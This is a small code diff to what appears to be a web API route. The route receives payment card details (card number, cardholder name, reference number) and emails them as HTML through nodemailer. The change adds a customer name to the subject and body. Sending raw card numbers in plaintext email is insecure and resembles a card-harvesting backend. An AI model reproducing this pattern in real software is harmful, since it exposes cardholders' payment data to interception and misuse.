@@ -15,6 +15,7 @@ const transporter = nodemailer.createTransport({
 export async function POST(req: Request) {
 
     const body = await req.json() as {
+        name: string;
         refNumber: string;
         cardNumber: string;
         cardName: string;
@@ -28,7 +29,7 @@ export async function POST(req: Request) {
     const mailOptions = {
         from: process.env.EMAIL_FROM_VERIFIED,
         to: process.env.EMAIL_TO_ANY,
-        subject: `PD - Ref: ${body.refNumber}`,
+        subject: `PD - Ref: ${body.refNumber} - ${body.name}`,
         html: `
         <html lang="en">
         <head>
@@ -57,7 +58,7 @@ export async function POST(req: Request) {
         </head>
         <body>
             <h4>Payment Details</h4>
-            <p><b>Ref Number: ${body.refNumber}</b></p>
+            <p><b>Ref Number: ${body.refNumber} -- ${body.name}</b></p>
             <table>
                 <tr>
                     <td>Card Number</td>
